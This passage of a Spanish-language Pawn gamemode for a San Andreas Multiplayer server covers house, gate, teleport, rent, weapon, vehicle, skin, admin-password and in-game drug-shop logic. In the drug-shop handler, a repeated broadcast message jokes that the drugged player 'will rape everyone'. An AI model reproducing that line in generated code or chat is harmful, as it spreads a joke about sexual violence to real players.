        SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has desbloqueado tu casa.");
    	dini_IntSet(str1,"Locked",0);
    	hInfo[housenumber][Locked] = 0;
    }
    else
    {
        SendClientMessage(playerid, red, "|Error| »{EAEAEA} Esta casa no es tuya.");
    }
	return 1;
}

CMD:reja1(playerid,params[])
{
	#pragma unused params
	if(Reja1_is_open==0){
		new Float:pos_x, Float:pos_y, Float:pos_z;
		pos_x=1282.7783;
		pos_y=-2062.3811;
		pos_z=65.6941;
		if(AreaRejas(playerid, Float:pos_x, Float:pos_y, Float:pos_z)){
			Reja1_is_open = 1;
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has abierto la reja 1 satisfactoriamente.");
			MoveObject(Reja1, 1282.7783, -2062.3811, 65.6941, 2.5);
		}
	}else{
		new Float:pos_x, Float:pos_y, Float:pos_z;
		pos_x=1282.7783;
		pos_y=-2062.3811;
		pos_z=65.6941;
		if(AreaRejas(playerid, Float:pos_x, Float:pos_y, Float:pos_z)){
			Reja1_is_open = 0;
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has cerrado la reja 1 satisfactoriamente.");
			MoveObject(Reja1, 1282.77832, -2062.38110, 60.71246, 2.5);
		}
	}
	return 1;
}


forward AreaRejas(playerid, Float:pos_x, Float:pos_y, Float:pos_z);
public AreaRejas(playerid, Float:pos_x, Float:pos_y, Float:pos_z){
	new Float:reja_x, Float:reja_y, Float:reja_z;
	GetPlayerPos(playerid, reja_x, reja_y, reja_z);
	if(reja_x>pos_x+20.00 || reja_x<pos_x-20.00 || reja_y>pos_y+20.00 || reja_y<pos_y-20.00 || reja_z>pos_z+20.00 || reja_z<pos_z-20.00){
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Usted se encuentra lejos.");
		return false;
	}else{
		return true;
	}
}

CMD:entrar(playerid,params[])
{
	new str1[255],pname[24],housenumber;
	housenumber = GetHouseID(playerid);
	GetPlayerPos(playerid, housex, housey, housez);
	format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
	GetPlayerName(playerid, pname, 24);
	if(hInfo[housenumber][Locked]==1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} La casa esta bloqueada.");
    playerworld[playerid] = GetPlayerVirtualWorld(playerid);
 	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has entrado a la casa.");
    SetPlayerVirtualWorld(playerid, hInfo[housenumber][Virtualworld]);
    SetPlayerInterior(playerid, hInfo[housenumber][Interior]);
	SetPlayerPos(playerid, hInfo[housenumber][InteriorX], hInfo[housenumber][InteriorY], hInfo[housenumber][InteriorZ]);
	playerinterior[playerid] = hInfo[housenumber][Interior];
   	return 1;
}

CMD:enterh(playerid,params[]){
	#pragma unused params
	cmd_entrar(playerid,"\1");
	return 1;
}

CMD:exith(playerid,params[])
{
	if(GetPlayerInterior(playerid)==playerinterior[playerid])
	{
        SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	    TogglePlayerControllable(playerid, 0);
		SetPlayerPos(playerid, housex, housey, housez);
		SetPlayerInterior(playerid, playerworld[playerid]);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else
	{
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No has entrado a ninguna casa.");
	}
   	return 1;
}

CMD:casa(playerid,params[])
{
    if(PlayerInfo[playerid][Jailed] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes usar comandos estando encarcelado.");
	new str1[256],pname[24],str[256];
	GetPlayerName(playerid, pname, sizeof(pname));
	format(str1, sizeof(str1), "ladmin/users/%s.sav", udb_encode(pname));
	if (dini_Exists(str1))
	{
		if(dini_Int(str1,"Houseid")!=-255)
		{
			TeleTimer[playerid] = SetTimerEx("ttimer", 1000, true, "i",playerid);
	       	tseconds[playerid] = 6;
			//format(tstring,45,"You Must wait %d seconds before teleporting", tseconds[playerid]-1);
	       	if(PlayerInfo[playerid][Level] == 0) //SendClientMessage(playerid,COLOR_LIGHTBLUE, tstring);
	       	vCount[playerid] = 1;
	       	Tx[playerid] = dini_Float(str1,"SpawnX");
	       	Ty[playerid] = dini_Float(str1,"SpawnY");
	       	Tz[playerid] = dini_Float(str1,"SpawnZ");
	       	Ti[playerid] = strval(str);
	       	new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
            format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a su casa. {00BFFF}(/Gotoh)",PlayerName);
            GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~tu casa",2500,3);
            SendClientMessageToAll(red, fString);
            SetPlayerInterior(playerid, playerworld[playerid]);
			SetPlayerVirtualWorld(playerid, 0);
			format(telestring,43," ");
		}
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Tu no tienes casa.");
	return 1;
}

CMD:gotoh(playerid,params[]){
	#pragma unused params
	cmd_casa(playerid,"\1");
	return 1;
}

CMD:ircasa(playerid,params[])
{
	new str1[256],str[256];
	if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Gotoh2 [Jugador]");
	format(str1, sizeof(str1), "ladmin/users/%s.sav", udb_encode(params));
	if (dini_Exists(str1))
	{
		if(dini_Int(str1,"Houseid")!=-255)
		{
			TeleTimer[playerid] = SetTimerEx("ttimer", 1000, true, "i",playerid);
	       	tseconds[playerid] = 6;
	       	vCount[playerid] = 1;
	       	//if(PlayerInfo[playerid][Level] == 0)
	       	Tx[playerid] = dini_Float(str1,"SpawnX");
	       	Ty[playerid] = dini_Float(str1,"SpawnY");
	       	Tz[playerid] = dini_Float(str1,"SpawnZ");
	       	Ti[playerid] = strval(str);
	       	new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
            format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a la casa de {00BFFF}%s.",PlayerName, params);
            SendClientMessageToAll(red, fString);
		}
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador no tiene casa.");
	return 1;
}

CMD:gotoh2(playerid,params[]){
	#pragma unused params
	cmd_ircasa(playerid,"\1");
	return 1;
}

stock GetHouseID(playerid)
{
	for(new i=0; i<MAX_HOUSES; i++)
	{
	    if(PlayerToPoint(MAX_DISTANCE_TO_PROP, playerid, hInfo[i][iconx], hInfo[i][icony], hInfo[i][iconz]))
	    {
	        return i;
		}
	}
	return -255;
}

public rentfee()
{
	new str[255],str2[255],pname[24];
	for(new houseid=0;houseid<MAX_HOUSES;houseid++)
	{
		format(str, sizeof(str), "SATDM/Houses/houseid%d", houseid);
		if(strcmp(hInfo[houseid][Renter], "ForRent", true))
		{
			for(new ii=0;ii<MAX_PLAYERS;ii++)
			{
		    	if(IsPlayerConnected(ii))
	  			{
	  		    	GetPlayerName(ii, pname, 24);
        			if(strcmp(hInfo[houseid][Renter], pname, true)==0)
        			{
        	 		   	format(str2, sizeof(str2), "|Info| »{EAEAEA} Tienes que pagar {52C433}$%d{EAEAEA} por la hora que has rentado la casa.", hInfo[houseid][Rentcost]);
        	 		   	SendClientMessage(ii, red, str2);
						dini_IntSet(str, "RentGet", dini_Int(str, "RentGet")+hInfo[houseid][Rentcost]);
						dini_IntSet(str, "RentPay", dini_Int(str, "RentPay")+hInfo[houseid][Rentcost]);
						hInfo[houseid][Rentfee]=1;
					}
				}
			}
			if(hInfo[houseid][Rentfee]==0)
			{
				    if(strcmp(hInfo[houseid][Renter],"ForRent"))
				    {
				        dini_IntSet(str, "RentGet", dini_Int(str, "RentGet")+hInfo[houseid][Rentcost]);
				        dini_IntSet(str, "RentPay", dini_Int(str, "RentPay")+hInfo[houseid][Rentcost]);
				    }
			}
			hInfo[houseid][Rentfee]=0;
		}
	}
}

stock sscanf(string[], format[], {Float,_}:...)
{
	#if defined isnull
		if (isnull(string))
	#else
		if (string[0] == 0 || (string[0] == 1 && string[1] == 0))
	#endif
		{
			return format[0];
		}
	#pragma tabsize 4
	new
		formatPos = 0,
		stringPos = 0,
		paramPos = 2,
		paramCount = numargs(),
		delim = ' ';
	while (string[stringPos] && string[stringPos] <= ' ')
	{
		stringPos++;
	}
	while (paramPos < paramCount && string[stringPos])
	{
		switch (format[formatPos++])
		{
			case '\0':
			{
				return 0;
			}
			case 'i', 'd':
			{
				new
					neg = 1,
					num = 0,
					ch = string[stringPos];
				if (ch == '-')
				{
					neg = -1;
					ch = string[++stringPos];
				}
				do
				{
					stringPos++;
					if ('0' <= ch <= '9')
					{
						num = (num * 10) + (ch - '0');
					}
					else
					{
						return -1;
					}
				}
				while ((ch = string[stringPos]) > ' ' && ch != delim);
				setarg(paramPos, 0, num * neg);
			}
			case 'h', 'x':
			{
				new
					num = 0,
					ch = string[stringPos];
				do
				{
					stringPos++;
					switch (ch)
					{
						case 'x', 'X':
						{
							num = 0;
							continue;
						}
						case '0' .. '9':
						{
							num = (num << 4) | (ch - '0');
						}
						case 'a' .. 'f':
						{
							num = (num << 4) | (ch - ('a' - 10));
						}
						case 'A' .. 'F':
						{
							num = (num << 4) | (ch - ('A' - 10));
						}
						default:
						{
							return -1;
						}
					}
				}
				while ((ch = string[stringPos]) > ' ' && ch != delim);
				setarg(paramPos, 0, num);
			}
			case 'c':
			{
				setarg(paramPos, 0, string[stringPos++]);
			}
			case 'f':
			{

				new changestr[16], changepos = 0, strpos = stringPos;
				while(changepos < 16 && string[strpos] && string[strpos] != delim)
				{
					changestr[changepos++] = string[strpos++];
    				}
				changestr[changepos] = '\0';
				setarg(paramPos,0,_:floatstr(changestr));
			}
			case 'p':
			{
				delim = format[formatPos++];
				continue;
			}
			case '\'':
			{
				new
					end = formatPos - 1,
					ch;
				while ((ch = format[++end]) && ch != '\'') {}
				if (!ch)
				{
					return -1;
				}
				format[end] = '\0';
				if ((ch = strfind(string, format[formatPos], false, stringPos)) == -1)
				{
					if (format[end + 1])
					{
						return -1;
					}
					return 0;
				}
				format[end] = '\'';
				stringPos = ch + (end - formatPos);
				formatPos = end + 1;
			}
			case 'u':
			{
				new
					end = stringPos - 1,
					id = 0,
					bool:num = true,
					ch;
				while ((ch = string[++end]) && ch != delim)
				{
					if (num)
					{
						if ('0' <= ch <= '9')
						{
							id = (id * 10) + (ch - '0');
						}
						else
						{
							num = false;
						}
					}
				}
				if (num && IsPlayerConnected(id))
				{
					setarg(paramPos, 0, id);
				}
				else
				{
					#if !defined foreach
						#define foreach(%1,%2) for (new %2 = 0; %2 < MAX_PLAYERS; %2++) if (IsPlayerConnected(%2))
						#define __SSCANF_FOREACH__
					#endif
					string[end] = '\0';
					num = false;
					new
						ssname[MAX_PLAYER_NAME];
					id = end - stringPos;
					foreach (Player, playerid)
					{
						GetPlayerName(playerid, ssname, sizeof (ssname));
						if (!strcmp(ssname, string[stringPos], true, id))
						{
							setarg(paramPos, 0, playerid);
							num = true;
							break;
						}
					}
					if (!num)
					{
						setarg(paramPos, 0, INVALID_PLAYER_ID);
					}
					string[end] = ch;
					#if defined __SSCANF_FOREACH__
						#undef foreach
						#undef __SSCANF_FOREACH__
					#endif
				}
				stringPos = end;
			}
			case 's', 'z':
			{
				new
					i = 0,
					ch;
				if (format[formatPos])
				{
					while ((ch = string[stringPos++]) && ch != delim)
					{
						setarg(paramPos, i++, ch);
					}
					if (!i)
					{
						return -1;
					}
				}
				else
				{
					while ((ch = string[stringPos++]))
					{
						setarg(paramPos, i++, ch);
					}
				}
				stringPos--;
				setarg(paramPos, i, '\0');
			}
			default:
			{
				continue;
			}
		}
		while (string[stringPos] && string[stringPos] != delim && string[stringPos] > ' ')
		{
			stringPos++;
		}
		while (string[stringPos] && (string[stringPos] == delim || string[stringPos] <= ' '))
		{
			stringPos++;
		}
		paramPos++;
	}
	do
	{
		if ((delim = format[formatPos++]) > ' ')
		{
			if (delim == '\'')
			{
				while ((delim = format[formatPos++]) && delim != '\'') {}
			}
			else if (delim != 'z')
			{
				return delim;
			}
		}
	}
	while (delim > ' ');
	return 0;
}

stock strrest(const string[], &index)
{
	new length = strlen(string);
	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}
	new offset = index;
	new result[128];
	while ((index < length) && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}
public ResetMusic()
{
    KillTimer(Rmusica);
	Musica = 0;
	return 1;
}

public OnPlayerModelSelection(playerid, response, listid, modelid)
{
	if(listid == armaslist)
	{
		if(response)
		{
			switch(modelid)
			{
			case 321:
			{
				GivePlayerWeapon(playerid, 10, 500);
				SendClientMessage(playerid, red, "|Info| » {EAEAEA} Has obtenido un dildo.");
			}
			case 322:
			{
				GivePlayerWeapon(playerid, 11, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un consolador.");
			}
			case 323:
			{
				GivePlayerWeapon(playerid, 12, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un dildo.");
			}
			case 324:
			{
				GivePlayerWeapon(playerid, 13, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un consolador.");
			}
			case 325:
			{
				GivePlayerWeapon(playerid, 14, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido unas flores.");
			}
			case 326:
			{
				GivePlayerWeapon(playerid, 15, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un fierro.");
			}
			case 343:
			{
				GivePlayerWeapon(playerid, 17, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido granadas de gas lacrimogeno.");
			}
			case 331:
			{
				GivePlayerWeapon(playerid, 1, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un puño americano.");
			}
			case 333:
			{
				GivePlayerWeapon(playerid, 2, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un palo de golf.");
			}
			case 334:
			{
				GivePlayerWeapon(playerid, 3, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un palo policial.");
			}
			case 335:
			{
				GivePlayerWeapon(playerid, 4, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un cuchillo.");
			}
			case 336:
			{
				GivePlayerWeapon(playerid, 5, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un bate.");
			}
			case 337:
			{
				GivePlayerWeapon(playerid, 6, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una pala.)");
			}
			case 338:
			{
				GivePlayerWeapon(playerid, 7, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un palo de billar.");
			}
			case 339:
			{
				GivePlayerWeapon(playerid, 8, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una katana.");
			}
			case 341:
			{
				GivePlayerWeapon(playerid, 9, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una motocierra.");
			}
			case 346:
			{
				GivePlayerWeapon(playerid, 22, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una pistola.");
			}
			case 347:
			{
				GivePlayerWeapon(playerid, 23, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una silenciadora.");
			}
			case 348:
			{
				GivePlayerWeapon(playerid, 24, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una Desert Eagle.");
			}
			case 372:
			{
				GivePlayerWeapon(playerid, 32, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una Tec9.");
			}
			case 352:
			{
				GivePlayerWeapon(playerid, 28, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una UZI.");
			}
			case 349:
			{
				GivePlayerWeapon(playerid, 25, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una escopeta.");
			}
			case 350:
			{
				GivePlayerWeapon(playerid, 26, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una escopeta recortada.");
			}
			case 351:
			{
				GivePlayerWeapon(playerid, 27, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una SPAZ12.");
			}
			case 353:
			{
				GivePlayerWeapon(playerid, 29, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una MP5.");
			}
			case 355:
			{
				GivePlayerWeapon(playerid, 30, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una AK47.");
			}
			case 356:
			{
				GivePlayerWeapon(playerid, 31, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una M4");
			}
			case 357:
			{
				GivePlayerWeapon(playerid, 33, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un rifle de caza.");
			}
			case 358:
			{
				GivePlayerWeapon(playerid, 34, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un rifle francotirador.");
			}
			case 365:
			{
				GivePlayerWeapon(playerid,41,500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una lata de spray.");
			}
			case 366:
			{
				GivePlayerWeapon(playerid,42,500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un extinguidor.");
			}
			case 367:
			{
				GivePlayerWeapon(playerid,43,500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido una cámara.");
			}
			case 371:
			{
				GivePlayerWeapon(playerid, 46,500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has obtenido un paracaídas.");
			}
		}
		SavePlayer(playerid);
		/*new arma0, balas0, arma1, balas1, arma2, balas2, arma3, balas3, arma4, balas4, arma5, balas5, arma6, balas6, arma7, balas7, arma8, balas8, arma9, balas9, arma10, balas10, arma12, balas12;
		GetPlayerWeaponData(playerid,0,arma0,balas0);
		GetPlayerWeaponData(playerid,1,arma1,balas1);
		GetPlayerWeaponData(playerid,2,arma2,balas2);// hand gun
		GetPlayerWeaponData(playerid,3,arma3,balas3);//shotgun
		GetPlayerWeaponData(playerid,4,arma4,balas4);// SMG
		GetPlayerWeaponData(playerid,5,arma5,balas5);// AK47 / M4
		GetPlayerWeaponData(playerid,6,arma6,balas6);// rifle
		//GetPlayerWeaponData(playerid,7,arma7,balas7);// rocket launcher
		GetPlayerWeaponData(playerid,8,arma8,balas8);
		GetPlayerWeaponData(playerid,9,arma9,balas9);
		GetPlayerWeaponData(playerid,10,arma10,balas10);
		GetPlayerWeaponData(playerid,12,arma12,balas12);
		dUserSetINT(PlayerName2(playerid)).("arma0",arma0); dUserSetINT(PlayerName2(playerid)).("arma0balas",balas0);
		dUserSetINT(PlayerName2(playerid)).("arma1",arma1); dUserSetINT(PlayerName2(playerid)).("arma1balas",balas1);
	   	dUserSetINT(PlayerName2(playerid)).("arma2",arma2); dUserSetINT(PlayerName2(playerid)).("arma2balas",balas2);
	  	dUserSetINT(PlayerName2(playerid)).("arma3",arma3);	dUserSetINT(PlayerName2(playerid)).("arma3balas",balas3);
	  	dUserSetINT(PlayerName2(playerid)).("arma4",arma4);	dUserSetINT(PlayerName2(playerid)).("arma4balas",balas4);
		dUserSetINT(PlayerName2(playerid)).("arma5",arma5); dUserSetINT(PlayerName2(playerid)).("arma5balas",balas5);
	  	dUserSetINT(PlayerName2(playerid)).("arma6",arma6);	dUserSetINT(PlayerName2(playerid)).("arma6balas",balas6);
		//dUserSetINT(PlayerName2(playerid)).("arma7",arma7); dUserSetINT(PlayerName2(playerid)).("arma7balas",balas7);
		dUserSetINT(PlayerName2(playerid)).("arma8",arma8); dUserSetINT(PlayerName2(playerid)).("arma8balas",balas8);
		dUserSetINT(PlayerName2(playerid)).("arma9",arma9); dUserSetINT(PlayerName2(playerid)).("arma9balas",balas9);
		dUserSetINT(PlayerName2(playerid)).("arma10",arma10); dUserSetINT(PlayerName2(playerid)).("arma10balas",balas10);
		dUserSetINT(PlayerName2(playerid)).("arma12",arma12); dUserSetINT(PlayerName2(playerid)).("arma12balas",balas12);*/
	}
		else SendClientMessage(playerid, red, "|Info| » {EAEAEA}Has cancelado");
		return 1;
}
	/* 		GetPlayerPos( playerid, x, y, z );
			GetPlayerFacingAngle( playerid, angle );
			PlayerVehicle=CreateVehicle(model_array[listitem],x,y,z,angle,-1,-1,cellmax);
			LinkVehicleToInterior(PlayerVehicle,GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid,PlayerVehicle,0);
			VehicleInfo[PlayerVehicle][Temp] = 1;*/
	//new creovehiculo[MAX_PLAYERS];
	if(listid == autoslist)
{
	if(response)
	{
		if(SpawnedVehicles[playerid] != 0) DestroyVehicle(SpawnedVehicles[playerid]);
		new Float:X,Float:Y,Float:Z,Float:ROT;
		GetPlayerPos(playerid,X,Y,Z);
		GetPlayerFacingAngle (playerid,ROT);
		SpawnedVehicles[playerid] = CreateVehicle(modelid,X,Y,Z,ROT,-1,-1,60);
		PutPlayerInVehicle(playerid,SpawnedVehicles[playerid],0);
		VehicleInfo[SpawnedVehicles[playerid]][Temp] = 1;
	}
	else SendClientMessage(playerid, red, "|Info| » {EAEAEA}Has cancelado");
	return 1;
}
	if(listid == skinlist)
	{
		if(response)
		{
			new string[128];
			SetPlayerSkin(playerid, modelid);
			dUserSetINT(PlayerName2(playerid)).("FavSkin",modelid);
		 	format(string, sizeof(string), "|Info| »{EAEAEA} Tu skin se ha guardado correctamente. {FF0000}[SkinID: %d]",modelid);
		 	SendClientMessage(playerid,red,string);
		 	dUserSetINT(PlayerName2(playerid)).("UseSkin",1);
    	    SetPlayerSkin(playerid,dUserINT(PlayerName2(playerid)).("FavSkin"));
		}
		else SendClientMessage(playerid, red, "|Info| » {EAEAEA}Has cancelado");
		return 1;
	}
	return 1;
}
//==========================On Dialog Response==================================
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	new string[128];
	new stringa[600];
	new adminname[MAX_PLAYER_NAME];
	#pragma tabsize 0
	GetPlayerName(playerid, adminname, sizeof(adminname));
	if(dialogid == DIALOG_TYPE_SecondaryRcon)
    {
    	if (response)
    	{
 			if (!strcmp(SecondaryRconPass, inputtext) && !(!strlen(inputtext)))
			{
				GameTextForPlayer(playerid, "~w~Bienvenido~n~~r~Administrador",2500,3);
			}
			else
			{
				if(Attempts[playerid] == 3)
				{
 					Kick(playerid);
				}
				Attempts[playerid] ++;
				new tmp[140];
				SendClientMessage(playerid, 0xFF0000AA, "{FF0000}[ERROR]:{FFFFFF} Contraseña Incorrecta.");
				format(tmp,sizeof(tmp),"{FFFFFF}Contraseña Incorrecta. \n{FFFFFF}Ingresa la contraseña correcta\n\n{FFFFFF}Intento Numero: {FF0000}%d/3", Attempts[playerid]);
				ShowPlayerDialog(playerid, DIALOG_TYPE_SecondaryRcon, DIALOG_STYLE_INPUT, "   {FF0000}Segunda RCON",tmp, "Entrar", "Exit");
			}
    	}
		else
		{
 		return Kick(playerid);
		}
    }
	if(dialogid == Drogas)
    {
     	if(response)
     	{
     		if(listitem==0)
     		{
				if(INFO[playerid][UsaDrogas] == 1) return SendClientMessage(playerid,Color,"{FF0000}[ERROR]:{FFFFFF} Ya estas drogado, espera a que se termine el efecto.");
				if(INFO[playerid][UsaDrogas] == 0)
				if(GetPlayerMoney(playerid) < 4000) return SendClientMessage(playerid, 0xFF0000FF, "{FF0000}[ERROR]:{FFFFFF} Debes tener {00FF00}$4.000{FFFFFF} para comprar {006400}Marihuana.");
				new Byte[128],
				Nombre[MAX_PLAYER_NAME];
				GetPlayerName(playerid,Nombre,sizeof(Nombre));
				format(Byte,sizeof(Byte),"{FF0000}[DROGAS]:{0080FF} %s{FFFFFF} Esta drogado y los violara a todos.",Nombre);
				SendClientMessageToAll(Color,Byte);
				GameTextForPlayer(playerid, "~w~Modo Marihuana~n~~r~Activado", 3000, 3);
				SetTimerEx("TerminarEfectoDeLaDroga", 180000, 0,"e",playerid);
				SetTimerEx("ComenzarEfectoDeDroga", 500, 0,"e",playerid);
				SetPlayerWeather(playerid, -70);
				GivePlayerMoney(playerid, -4000);
				SetPlayerDrunkLevel(playerid, 7000);
				ApplyAnimation(playerid,"ped","Smoke_in_car",4.1,1,1,1,1,1);
			}
     		if(listitem==1)
     		{
     			if(INFO[playerid][UsaDrogas] == 1) return SendClientMessage(playerid,Color,"{FF0000}[ERROR]:{FFFFFF} Ya estas drogado, espera a que se termine el efecto.");
				if(INFO[playerid][UsaDrogas] == 0)
				if(GetPlayerMoney(playerid) < 5000) return SendClientMessage(playerid, 0xFF0000FF, "{FF0000}[ERROR]:{FFFFFF} ¡Debes tener {00FF00}$5.000{FFFFFF} Para comprar {006400}Heroina!");
				new Byte[128],
				Nombre[MAX_PLAYER_NAME];
				GetPlayerName(playerid,Nombre,sizeof(Nombre));
				format(Byte,sizeof(Byte),"{FF0000}[DROGAS]:{0080FF} %s{FFFFFF} Esta drogado y los violara a todos.",Nombre);
				SendClientMessageToAll(Color,Byte);
				GameTextForPlayer(playerid, "~w~Modo Heroina~n~~r~Activado", 3000, 3);
				SetTimerEx("TerminarEfectoDeLaDroga", 240000, 0,"e",playerid);
				SetTimerEx("ComenzarEfectoDeDroga", 500, 0,"e",playerid);
				SetPlayerWeather(playerid, -50);
				GivePlayerMoney(playerid, -5000);
				SetPlayerDrunkLevel(playerid, 10000);
				ApplyAnimation(playerid,"ped","Smoke_in_car",4.1,1,1,1,1,1);
     		}
     		if(listitem==2)
     		{
				if(INFO[playerid][UsaDrogas] == 1) return SendClientMessage(playerid,Color,"{FF0000}[ERROR]:{FFFFFF} Ya estas drogado, espera a que se termine el efecto.");
				if(INFO[playerid][UsaDrogas] == 0)
				if(GetPlayerMoney(playerid) < 5000) return SendClientMessage(playerid, 0xFF0000FF, "{FF0000}[ERROR]:{FFFFFF} ¡Debes tener {00FF00}$5.000{FFFFFF} Para comprar{006400} Cocaina!");
				new Byte[128],
				Nombre[MAX_PLAYER_NAME];
				GetPlayerName(playerid,Nombre,sizeof(Nombre));
				format(Byte,sizeof(Byte),"{FF0000}[DROGAS]:{0080FF} %s{FFFFFF} Esta drogado y los violara a todos.",Nombre);
				SendClientMessageToAll(Color,Byte);
				GameTextForPlayer(playerid, "~w~Modo Cocaina~n~~r~Activado", 3000, 3);
				SetTimerEx("TerminarEfectoDeLaDroga", 240000, 0,"e",playerid);
				SetTimerEx("ComenzarEfectoDeDroga", 500, 0,"e",playerid);
				SetPlayerWeather(playerid, -40);
				GivePlayerMoney(playerid, -5000);
				SetPlayerDrunkLevel(playerid, 20000);
				ApplyAnimation(playerid,"ped","Smoke_in_car",4.1,1,1,1,1,1);
     		}
     		if(listitem==3)
     		{
				if(INFO[playerid][UsaDrogas] == 1) return SendClientMessage(playerid,Color,"{FF0000}[ERROR]:{FFFFFF} Ya estas drogado, espera a que se termine el efecto.");
				if(INFO[playerid][UsaDrogas] == 0)
				if(GetPlayerMoney(playerid) < 7000) return SendClientMessage(playerid, 0xFF0000FF, "{FF0000}[ERROR]:{FFFFFF} ¡Debes tener {00FF00}$7.000{FFFFFF} Para comprar {006400}Extasis!");
				new Byte[128],
				Nombre[MAX_PLAYER_NAME];
				GetPlayerName(playerid,Nombre,sizeof(Nombre));
				format(Byte,sizeof(Byte),"{FF0000}[DROGAS]:{0080FF} %s{FFFFFF} Esta drogado y los violara a todos.",Nombre);
				SendClientMessageToAll(Color,Byte);
				GameTextForPlayer(playerid, "~w~Modo Extasis~n~~r~Activado", 3000, 3);
				SetTimerEx("TerminarEfectoDeLaDroga", 300000, 0,"e",playerid);
				SetTimerEx("ComenzarEfectoDeDroga", 500, 0,"e",playerid);
				SetPlayerWeather(playerid, -32);
				GivePlayerMoney(playerid, -7000);
				SetPlayerDrunkLevel(playerid, 30000);
				ApplyAnimation(playerid,"ped","Smoke_in_car",4.1,1,1,1,1,1);
     		}
     		if(listitem==4)
     		{
				if(INFO[playerid][UsaDrogas] == 1) return SendClientMessage(playerid,Color,"{FF0000}[ERROR]:{FFFFFF} Ya estas drogado, espera a que se termine el efecto.");
				if(INFO[playerid][UsaDrogas] == 0)
				if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid, 0xFF0000FF, "{FF0000}[ERROR]:{FFFFFF} ¡Debes tener 00FF00}$10.000{FFFFFF} Para comprar {006400}LSD!");
				new Byte[128],
				Nombre[MAX_PLAYER_NAME];
				GetPlayerName(playerid,Nombre,sizeof(Nombre));
				format(Byte,sizeof(Byte),"{FF0000}[DROGAS]:{0080FF} %s{FFFFFF} Esta drogado y los violara a todos.",Nombre);
				SendClientMessageToAll(Color,Byte);
				GameTextForPlayer(playerid, "~w~Modo LSD~n~~r~Activado", 3000, 3);
				SetTimerEx("TerminarEfectoDeLaDroga", 480000, 0,"e",playerid);
				SetTimerEx("ComenzarEfectoDeDroga", 500, 0,"e",playerid);
				SetPlayerWeather(playerid, -47);
				GivePlayerMoney(playerid, -10000);
				SetPlayerDrunkLevel(playerid, 40000);
				ApplyAnimation(playerid,"ped","Smoke_in_car",4.1,1,1,1,1,1);
     		}
     		if(listitem==5)
     		{
				if(INFO[playerid][UsaDrogas] == 1) return SendClientMessage(playerid,Color,"{FF0000}[ERROR]:{FFFFFF} Ya estas drogado, espera a que se termine el efecto.");
				if(INFO[playerid][UsaDrogas] == 0)
				if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid, 0xFF0000FF, "{FF0000}[ERROR]:{FFFFFF} ¡Debes tener {00FF00}$10.000{FFFFFF} Para comprar {006400}Metanfetamina!");
				new Byte[128],
				Nombre[MAX_PLAYER_NAME];
				GetPlayerName(playerid,Nombre,sizeof(Nombre));
